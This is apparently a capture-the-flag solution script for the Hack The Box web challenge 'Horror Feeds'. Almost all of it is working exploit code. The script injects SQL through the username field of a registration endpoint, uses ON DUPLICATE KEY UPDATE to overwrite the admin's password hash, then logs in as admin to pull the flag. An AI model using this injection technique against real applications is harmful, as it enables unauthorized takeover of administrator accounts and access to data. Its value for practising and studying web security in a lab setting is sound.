#Challenge: Horror Feeds
import requests
import json

url = "http://<ip>:<port>/api/register"
# I'm gonna change the password of Admin, using ...ON DUPLICATE KEY UPDATE extension (to the INSERT statement)... and it will be admin (admin:admin)
data = {
    "username": 'admin\",\"$2b$12$iBjy3LnMCHsXioA0WyEY2eV0Zzu59rWkOUNOc2RqqNQtCk6Dprp1W\") ON DUPLICATE KEY UPDATE password=\"$2b$12$iBjy3LnMCHsXioA0WyEY2eV0Zzu59rWkOUNOc2RqqNQtCk6Dprp1W\"#',
    "password": "admin",
}
json_data = json.dumps(data)
headers = {
    "Content-Type": "application/json"
}
requests.post(url, data=json_data, headers=headers)
url = "http://<ip>:<port>/api/login"
data = {
    "username": "admin",
    "password": "admin",
}
json_data = json.dumps(data)
response = requests.post(url, data=json_data, headers=headers, allow_redirects=True)
cookies = response.cookies
url = "http://<ip>:<port>/dashboard"
response = requests.get(url, cookies=cookies)
print("LATEST Response:", response.text)
#chmod +x gethatflag.py
#./getheflag.py | grep -oE HTB{.*}